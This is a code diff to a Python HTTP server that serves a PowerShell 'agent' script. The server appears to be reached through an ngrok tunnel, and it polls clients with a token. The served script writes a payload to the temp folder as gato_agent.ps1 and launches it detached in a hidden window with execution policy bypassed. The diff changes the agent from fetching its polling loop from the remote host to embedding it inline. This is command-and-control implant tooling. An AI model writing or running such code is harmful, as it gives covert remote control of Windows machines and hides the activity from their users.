@@ -26,10 +26,10 @@ LOCK = threading.Lock()
 STATE = {'last_poll': 0.0, 'polls': 0}
 
 AGENT_PS = r'''$ErrorActionPreference = 'Continue'
-[Console]::OutputEncoding = [Text.Encoding]::UTF8
-$H = @{ 'ngrok-skip-browser-warning' = '1' }
-$src = (Invoke-WebRequest -UseBasicParsing -Headers $H -Uri '__MAC__/loop?t=__TOKEN__').Content
 $f = "$env:TEMP\gato_agent.ps1"
+$src = @'
+__LOOP__
+'@
 [IO.File]::WriteAllText($f, $src, (New-Object Text.UTF8Encoding $false))
 Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$f
 "agent started detached -> $f"
@@ -154,7 +154,8 @@ class H(BaseHTTPRequestHandler):
             host = self.headers.get('Host') or '127.0.0.1:%d' % PORT
             scheme = 'http' if host.startswith(('127.0.0.1', 'localhost')) else 'https'
             mac = scheme + '://' + host
-            src = AGENT_PS.replace('__MAC__', mac).replace('__TOKEN__', TOKEN)
+            loop = AGENT_LOOP.replace('__MAC__', mac).replace('__TOKEN__', TOKEN)
+            src = AGENT_PS.replace('__LOOP__', loop)
             self._ok(src.encode(), 'text/plain; charset=utf-8')
         else:
             self._ok({'error': 'nope'})
